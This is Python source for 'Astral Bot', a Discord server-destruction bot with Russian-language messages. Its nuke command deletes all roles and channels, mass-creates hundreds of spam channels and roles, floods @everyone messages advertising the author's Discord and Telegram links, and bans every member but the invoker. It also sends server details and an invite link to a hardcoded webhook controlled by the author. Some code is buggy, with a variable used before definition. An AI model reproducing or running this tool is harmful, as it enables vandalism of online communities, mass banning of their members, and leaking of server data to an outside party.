# Astral Bot
#https://t.me/numoun


import os
import discord
from discord.ext import commands
import datetime
import colorama

from colorama import Fore, init


import asyncio
import random

import aiohttp

from discord import Permissions

from discord.utils import get

from time import sleep

TOKEN = ''
PREFIX = '$'
INVITE = f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot'
loghook = 'https://discord.com/api/webhooks/1048308770683502643/D_15Iyus3gCiUPPvFk2ij8nS3ytB31OUyRrLpNo9XQsWlhIruEWgHCE2CZlgmJic5wE1'
astral_devs = [726072384452296773, 927164796325994497]

intents = discord.Intents.all()
client = commands.Bot(command_prefix = PREFIX, intents=intents)
client.remove_command('help')

@client.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.CommandOnCooldown):
        try: 
            await ctx.author.send(embed=discord.Embed(title=':x: Ошибка!', description=f'**у команды кулдаун, подожди**', colour=discord.Colour.from_rgb(255, 0, 0)))
        except:
            await ctx.send(embed=discord.Embed(title=':x: Ошибка!', description=f'**у команды кулдаун, подожди**', colour=discord.Colour.from_rgb(255, 0, 0)))


@client.event
async def on_ready():
    print('ready') 

async def kill_ch(ctx,ch):
    try:
        await ch.delete()
    except:
        pass

async def kill_rl(ctx,role):
    try:
        await role.delete()
    except: 
        pass

async def createch(ctx):
    try:
        c = await ctx.guild.create_text_channel(f'nuked-by-astral-{random.randint(1, 1000)}')
    except: 
        pass
    else:
        pass

async def spamchh(ch):
    try:
        await ch.send(f'||@everyone / @here||\nCrashed By Numoun, Lol:rofl:\nhttps://discord.gg/F9uNynGkDM\nhttps://t.me/numoun')
    except: 
        pass


async def createrl(ctx):
    try:
        await ctx.guild.create_role(f'Nuked by Astral')
    except:
        pass

async def bannes(ctx):
    for m in ctx.guild.members:
        if m != ctx.author:
            try:
                await m.ban(reason="Nuked by Astral")
            except:
                pass

@client.command(aliases = ['crash', 'astralcrash', 'astralnuke', 'auto', 'astralauto', 'kill', 'astralkill', 'c', 'a', 'k', 'n'])
@commands.cooldown(1, 300, commands.BucketType.default)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild 
    dt_now = datetime.datetime.now()
    async with aiohttp.ClientSession() as session:  
        webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
        await webhook.send(embed = discord.Embed(
            title=f'||                        ||{guild.name}||                       ||',
            description=f"""
**<:Discord_HypeSquadEvents:1040165733562335242> | ID сервера:** `{guild.id}`
**<:Chutumuz4:1042899732382617700> | Овнер:** `{guild.owner}`
**<:staff_blue:940304837575340063> | Участников:** `{len(guild.members)}`
**<:bughunterorange:943196832283111454> | Количество каналов:** `{len(guild.channels)}`
**<:channel:935902319986507857> | Количество ролей:** `{len(guild.roles)}`
**<:DeveloperBadge:1040166406643261481> | крашнул:** `{ctx.author}`
**<:blurpleverified:935902287073804288> | ID крашера:** `{ctx.author.id}`
**<:kilit:963793801854468146> | сервер крашнут ботом:** `{client.user}`""", 
            colour=discord.Colour.from_rgb(81, 161, 255)))

    for rolee in ctx.guild.roles:
        asyncio.create_task(kill_rl(ctx,role=rolee))
    for channel in ctx.guild.channels:
        asyncio.create_task(kill_ch(ctx,ch=channel))
    for _ in range(500):
        asyncio.create_task(createch(ctx))
        asyncio.create_task(createrl(ctx))      

    with open('astral.jpg', 'rb') as f:
        icon = f.read()
        try: 
            await ctx.guild.edit(name=f'Nuked by Astral', icon=icon)
            invitelinkk = await ctx.guild.text_channels[0].create_invite(max_uses=2, unique=True)
            print(guild.id)
        except:
            print(guild.id)
    async with aiohttp.ClientSession() as session:  
        webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
        await webhook.send(invitelinkk)
    



@client.command()
async def banall(ctx):
    await ctx.message.delete()
    asyncio.create_task(bannes(ctx))


@client.command()
async def liv(ctx):
    if not ctx.author.id in astral_devs:
        return await ctx.send("Анегдот", embed = discord.Embed(title='Идут 2 репера один в кепке и другой пизды получит', description=f'аххахапхзхпхахахахахахпхахахахахахахахахахахахахахахахахахпхпхахпхахпхпахпэпхаэаэаэпхпэпхпхааахпхахахахахахахахаАХАХАХАХАХАХАХАХАХАЭАХАХААЭАХАХАХАХА', colour = 0xf00a0a))
    for guild in client.guilds:
        if guild.id != 994364057605910639:
            try:
                await guild.leave()
                await ctx.send('-1')
            except:
                pass

@client.event
async def on_guild_channel_create(channel):
    for _ in range(15):
        asyncio.create_task(spamchh(ch=channel))
token = ''

client.run(token)